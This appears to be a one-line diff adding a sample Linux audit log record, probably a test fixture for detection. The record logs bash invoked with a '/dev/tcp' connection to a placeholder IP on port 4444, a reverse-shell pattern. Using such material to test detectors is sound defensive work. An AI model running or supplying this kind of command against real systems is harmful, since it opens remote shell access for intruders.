@@ -1,0 +1,1 @@
+type=EXECVE msg=audit(1789387200.100:42): argc=2 a0="bash" a1="-c /dev/tcp/192.0.2.1/4444"
